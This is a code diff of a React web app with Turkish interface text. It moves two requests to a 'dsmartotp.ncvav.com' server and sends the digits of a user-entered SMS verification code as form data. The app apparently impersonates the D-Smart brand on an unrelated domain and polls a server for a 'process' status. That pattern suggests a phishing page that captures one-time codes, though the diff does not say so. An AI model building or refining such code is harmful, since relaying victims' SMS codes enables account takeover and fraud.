@@ -48,16 +48,15 @@ function App() {
         return;
       }
 
+      const formData = new FormData();
+
+      formData.append("path", getPath);
+
       const response = await fetch(
-        "https://mobile.ncvav.com/Dsmart/Api/Process/",
+        "https://dsmartotp.ncvav.com/Service/Process/",
         {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            path: getPath,
-          }),
+          body: formData,
         },
       );
 
@@ -67,14 +66,14 @@ function App() {
 
       const data = await response.json();
 
-      console.log("Backend response:", data);
+      console.log("Process response:", data);
 
       if (data.process === 1) {
         setSonuc(null);
       } else if (data.process === true) {
-        return setSonuc("basarili");
+        setSonuc("basarili");
       } else if (data.process === false) {
-        return setSonuc("basarisiz");
+        setSonuc("basarisiz");
       } else if (data.process === 4) {
         setSonuc("bulunamadi");
       }
@@ -161,17 +160,19 @@ function App() {
     setHataMesaji("");
 
     try {
+      const formData = new FormData();
+
+      formData.append("path", getPath);
+
+      code.forEach((digit) => {
+        formData.append("kod[]", digit);
+      });
+
       const response = await fetch(
-        "https://mobile.ncvav.com/Dsmart/Api/Backend/",
+        "https://dsmartotp.ncvav.com/Service/Backend/",
         {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            path: getPath,
-            kod: code,
-          }),
+          body: formData,
         },
       );
 
@@ -179,20 +180,19 @@ function App() {
 
       console.log("Backend response:", data);
 
-      if (data.process === true) {
+      if (data.status === true) {
         setSonuc("basarili");
       } else {
         setSonuc("basarisiz");
         setHataMesaji(data.message || "SMS kodu hatalı");
       }
     } catch (error) {
-      console.error("sendCode hatası:", error);
+      console.error("Backend hatası:", error);
       setHataMesaji("Bağlantı hatası, lütfen tekrar deneyin.");
     } finally {
       setGonderiliyor(false);
     }
   };
-
   const handleTekrarDene = () => {
     window.location.reload();
   };
